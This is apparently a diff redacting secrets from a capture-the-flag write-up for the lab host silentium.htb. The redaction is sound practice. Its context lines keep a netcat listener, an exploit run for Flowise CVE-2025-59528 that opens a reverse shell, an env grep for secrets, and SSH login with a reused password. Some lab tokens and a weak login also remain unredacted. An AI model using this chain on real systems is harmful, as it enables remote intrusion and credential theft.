@@ -89,7 +89,7 @@ Content-Type: application/json; charset=utf-8
         "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
         "name": "admin",
         "email": "ben@silentium.htb",
-        "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
+        "credential": "<REDACTED>",
         "tempToken": "HF4JtQiC2UMHLbW3I5O7M1QEKrTeFujLTKbV7xQew0qG8nZL00pHgGlys3nTL1RS",
         "tokenExpiry": "2026-05-16T20:44:22.185Z",
         "status": "active",
@@ -115,7 +115,7 @@ We sign in to `http://staging.silentium.htb` as `ben@silentium.htb : Password123
 Navigating to **API Keys**, we retrieve the `DefaultKey`:
 
 ```
-hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
+<REDACTED>
 ```
 
 The platform version is visible in the UI: **Flowise 3.0.5** — a version documented to be vulnerable to **CVE-2025-59528**.
@@ -139,7 +139,7 @@ nc -lvnp 4444
 # Terminal 2 — exploit
 python3 flowise_chain.py \
     -t http://staging.silentium.htb \
-    --api-key hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc \
+    --api-key <REDACTED> \
     --lhost 10.10.17.92 \
     --lport 4444
 ```
@@ -172,8 +172,8 @@ We shift focus to environment variable leakage — a common exposure vector in c
 
 ```bash
 / # env | grep -iE 'pass|key|secret|token'
-FLOWISE_PASSWORD=F1l3_d0ck3r
-SMTP_PASSWORD=r04D!!_R4ge
+FLOWISE_PASSWORD=<REDACTED>
+SMTP_PASSWORD=<REDACTED>
 JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
 JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
 ```
@@ -182,7 +182,7 @@ Two plaintext passwords are exposed via the container's inherited environment. W
 
 ```bash
 ssh ben@silentium.htb
-# Password: r04D!!_R4ge  ← SMTP_PASSWORD — success
+# Password: <REDACTED>  ← SMTP_PASSWORD — success
 ```
 
 ```
